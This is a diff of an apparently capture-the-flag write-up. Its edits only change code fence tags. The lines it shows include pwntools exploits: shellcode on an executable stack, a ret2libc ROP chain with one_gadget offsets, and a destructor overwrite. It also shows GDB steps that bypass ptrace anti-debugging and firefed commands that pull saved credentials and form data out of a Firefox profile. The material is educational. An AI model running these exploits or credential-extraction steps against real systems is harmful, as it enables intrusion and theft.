@@ -30,7 +30,7 @@ Which leads us to the vulnerable parts of the code. The `printf` statement on li
 
 We deal with the easy part first, which is leaking the stack address for our input buffer. 
 
-```python=
+```python
 from pwn import *
 
 #: CONNECT TO CHALLENGE SERVERS
@@ -59,7 +59,7 @@ log.info(f"buffer address: hex({leak})")
 ```
 
 Given that the buffer has 32 bytes and directly after that we begin overwriting the saved base pointer (RBP) which is 8 bytes, we can control RIP after writing 40 bytes. To test this, we can send a cyclic pattern of 40 bytes + some invalid/dummy return address that crashes the program:
-```python=
+```python
 payload = cyclic(40)
 payload += b'AAAABBBB'
 p.sendline(payload)
@@ -69,7 +69,7 @@ p.interactive()
 
 Now we can proceed with our plan. Since we have a stack address from the leak + the stack is marked as executable (NX is disabled), we can place shellcode onto the stack then return to it. I simply used `shellcraft.sh()` from pwntools which automates creating the normal execve('/bin/sh') shellcode. 
 
-```python=
+```python
 payload = cyclic(40) #: offset + saved RBP
 payload += p64(leak + 48) #: control instruction pointer to return to an address we control
 payload += asm(shellcraft.sh()) #: shellcode, program execution will return to this 
@@ -105,7 +105,7 @@ We will be using `puts` as our read primitive. `puts` accepts string pointers as
 
 From here, we can compute the libc base address by subtracting the provided libc's puts symbol offset from the address that we have retrieved, e.g: 
 
-```python=
+```python
 libc.address = libc_leak - libc.sym.puts
 ```
 
@@ -117,7 +117,7 @@ We only need the `pop rdi ; ret` gadget because on x64 binaries, arguments to fu
 
 Now, `pop rdi` pops a value from the stack into the register, so it makes sense that the value that we control must also be on the stack. After it does that, we head to the `ret` instruction, which just means that we return to the address at the top of the stack. For this payload, the address that we want to return to is to `main` since we want to do the second stage of our exploit after the libc leak. Here's what the payload looks like for the first stage:
 
-```python=
+```python
 from pwn import *
 
 #: CONNECT TO CHALLENGE SERVERS
@@ -161,7 +161,7 @@ It successfully retrieved libc addresses and returned to the main function. Now,
 
 we can do a trial and error on which gadget works, which for this challenge was the second option (0x4f432). The final stage payload is as follows:
 
-```python=
+```python
 gadgets = [0x4f3d5, 0x4f432, 0x10a41c]
 payload = cyclic(40)
 payload += p64(ret)
@@ -200,7 +200,7 @@ Our plan then is to overwrite the destructor entry to point to the address of `_
 
 ![](https://i.imgur.com/Ujy99YD.png)
 
-```python=
+```python
 from pwn import *
 
 #: CONNECT TO CHALLENGE SERVERS
@@ -252,7 +252,7 @@ It simply runs a char-by-char comparison between our provided input and `&encryp
 
 Then we can proceed to write a short python script to retrieve the flag:
 
-```python=
+```python
 pin = [0x4c,0x13,0x54,0x7f,0x4d,0x45,0x7f,0x11,0x4e,0x7f,0x4c,0x13,0x54,0x7f,0x4d,0x45,0x45,0x45,0x45,0x7f,0x49,0x4e,0x01,0x01,0x00]
 print(''.join([chr(x ^ 0x20) for x in pin]))
 ```
@@ -264,7 +264,7 @@ print(''.join([chr(x ^ 0x20) for x in pin]))
 ## Hoverboard, rev 525
 
 This challenge was about bypassing some simple anti-debug tricks. Doing the usual file recon doesn't reveal much about the program, so we directly let GHIDRA analyze it. The decompiled code of the main function is as follows:
-```c=
+```c
 undefined8 main(void)
 
 {
@@ -337,7 +337,7 @@ I opened up the binary in GDB, disassembled the main function and searched for t
 
 We need to place a breakpoint at `*main + 191` which is before `ptrace` gets called. Next, the unsatisfiable check happens at `*main + 241, *main + 248` -> we need to jump away from these parts such that we continue execution on `*main + 261` which should correspond to the `strcmp` call on line 38 of the decompiled code. 
 
-```shell=
+```shell
 pwndbg> break *main + 191
 Breakpoint 1 at 0xd28
 pwndbg> break *main + 261
@@ -361,7 +361,7 @@ Now both strings match. We then continue stepping into the instructions until th
 
 Again, we need to change the value of the `rdi` register, since this should contain the secret key to decrypt the flag. We simply substitute it with the address of the secret key (which we know from the previous strcmp call):
 
-```shell=
+```shell
 pwndbg> set $rdi = (char *) 0x555555400ec8
 ```
 
@@ -383,7 +383,7 @@ I immediately recognized it as there was a tryhackme room (Glitch) that I solved
 
 For this challenge, I stumbled upon [firefed](https://github.com/numirias/firefed) and used it to analyze other aspects of the profile. We start by taking a look at the browser history:
 
-```shell=
+```shell
 $ firefed -p . history
 https://support.mozilla.org/en-US/products/firefox
     Title:      None
@@ -517,7 +517,7 @@ We take note of the FTP credentials. While it may seem interesting, there is no 
 
 We can further examine the firefox profile for stored passwords, more specifically on autofill forms:
 
-```shell=
+```shell
 $ firefed -p . forms  
 pid=eded09ed-efe3-4a7b-8ca1-eff4913afb9e
 pnid=140
